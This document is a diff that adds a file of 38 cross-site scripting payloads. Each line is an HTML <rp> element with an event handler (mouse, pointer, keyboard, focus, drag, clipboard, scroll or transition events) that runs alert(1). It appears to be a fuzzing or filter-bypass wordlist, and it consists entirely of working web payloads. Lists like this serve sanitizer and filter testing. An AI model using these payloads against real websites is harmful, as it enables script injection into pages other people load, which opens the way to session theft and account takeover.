@@ -1,0 +1,38 @@
+<rp contenteditable onbeforeinput=alert(1)>test
+<rp draggable="true" ondrag="alert(1)" style=display:block>test</rp>
+<rp draggable="true" ondragend="alert(1)" style=display:block>test</rp>
+<rp draggable="true" ondragenter="alert(1)" style=display:block>test</rp>
+<rp draggable="true" ondragleave="alert(1)" style=display:block>test</rp>
+<rp draggable="true" ondragstart="alert(1)" style=display:block>test</rp>
+<rp id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></rp>
+<rp id=x tabindex=1 onfocus=alert(1)></rp>
+<rp id=x tabindex=1 onfocusin=alert(1)></rp>
+<rp onafterscriptexecute=alert(1)><script>1</script>
+<rp onbeforescriptexecute=alert(1)><script>1</script>
+<rp onblur=alert(1) id=x tabindex=1 style=display:block>test</rp><input value=clickme>
+<rp onclick="alert(1)" style=display:block>test</rp>
+<rp oncontextmenu="alert(1)" style=display:block>test</rp>
+<rp oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<rp oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<rp ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</rp>
+<rp onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</rp><input value=clickme>
+<rp onkeydown="alert(1)" contenteditable style=display:block>test</rp>
+<rp onkeypress="alert(1)" contenteditable style=display:block>test</rp>
+<rp onkeyup="alert(1)" contenteditable style=display:block>test</rp>
+<rp onmousedown="alert(1)" style=display:block>test</rp>
+<rp onmouseenter="alert(1)" style=display:block>test</rp>
+<rp onmouseleave="alert(1)" style=display:block>test</rp>
+<rp onmousemove="alert(1)" style=display:block>test</rp>
+<rp onmouseout="alert(1)" style=display:block>test</rp>
+<rp onmouseover="alert(1)" style=display:block>test</rp>
+<rp onmouseup="alert(1)" style=display:block>test</rp>
+<rp onmousewheel=alert(1) style=display:block>requires scrolling
+<rp onpointerdown=alert(1) style=display:block>XSS</rp>
+<rp onpointerenter=alert(1) style=display:block>XSS</rp>
+<rp onpointerleave=alert(1) style=display:block>XSS</rp>
+<rp onpointermove=alert(1) style=display:block>XSS</rp>
+<rp onpointerout=alert(1) style=display:block>XSS</rp>
+<rp onpointerover=alert(1) style=display:block>XSS</rp>
+<rp onpointerrawupdate=alert(1) style=display:block>XSS</rp>
+<rp onpointerup=alert(1) style=display:block>XSS</rp>
+<rp onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></rp>
